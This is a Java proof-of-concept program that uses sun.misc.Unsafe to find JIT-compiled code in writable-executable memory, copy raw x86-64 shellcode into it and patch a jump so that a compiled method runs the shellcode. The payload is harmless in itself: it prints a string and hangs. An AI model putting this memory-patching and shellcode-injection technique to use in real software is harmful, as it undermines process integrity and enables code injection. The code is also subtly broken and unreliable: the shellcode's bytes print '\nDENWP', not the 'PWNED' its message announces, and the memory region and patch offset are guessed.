import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import sun.misc.Unsafe;

public final class Mark {
    static Unsafe U;
    static volatile long sink;
    static final byte[] PAT = {(byte) 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11};

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        for (int i = 0; i < 300_000; i++) sink += probe(i);

        List<long[]> regs = new ArrayList<>();
        for (String l : Files.readAllLines(Path.of("/proc/self/maps"))) {
            if (!l.contains("rwx")) continue;
            String[] p = l.split("\\s+")[0].split("-");
            regs.add(new long[]{Long.parseUnsignedLong(p[0], 16), Long.parseUnsignedLong(p[1], 16)});
        }
        long[] R = regs.get(2);

        long hit = -1;
        outer:
        for (long p = R[0]; p < R[1] - 8; p++) {
            if (U.getByte(p) != PAT[0]) continue;
            for (int i = 1; i < 8; i++) if (U.getByte(p + i) != PAT[i]) continue outer;
            hit = p; break;
        }
        long site = hit - 28;
        System.out.printf("site=%x bytes=%02x %02x%n", site, U.getByte(site) & 0xff, U.getByte(site + 1) & 0xff);

        byte[] shell = {
            0x48, 0x31, (byte) 0xd2, 0x52,
            0x48, (byte) 0xb8, 0x0a, 0x44, 0x45, 0x4e, 0x57, 0x50, 0x00, 0x00,
            0x50, 0x48, (byte) 0x89, (byte) 0xe6,
            0x48, 0x31, (byte) 0xc0, (byte) 0xb0, 0x01,
            0x48, 0x31, (byte) 0xff, 0x40, (byte) 0xb7, 0x01,
            0x48, 0x31, (byte) 0xd2, (byte) 0xb2, 0x06,
            0x0f, 0x05, (byte) 0xeb, (byte) 0xfe
        };
        long sc = R[1] - 0x1000;
        for (int i = 0; i < shell.length; i++) U.putByte(sc + i, shell[i]);

        int rel = (int) (sc - (site + 5));
        U.putByte(site, (byte) 0xE9);
        U.putByte(site + 1, (byte) (rel & 0xff));
        U.putByte(site + 2, (byte) ((rel >> 8) & 0xff));
        U.putByte(site + 3, (byte) ((rel >> 16) & 0xff));
        U.putByte(site + 4, (byte) ((rel >> 24) & 0xff));

        System.out.println("patched, calling probe (expect PWNED, then hang)");
        sink += probe(1);
        System.out.println("still alive");
    }

    static long probe(long x) { return x ^ 0x1122334455667788L; }
}
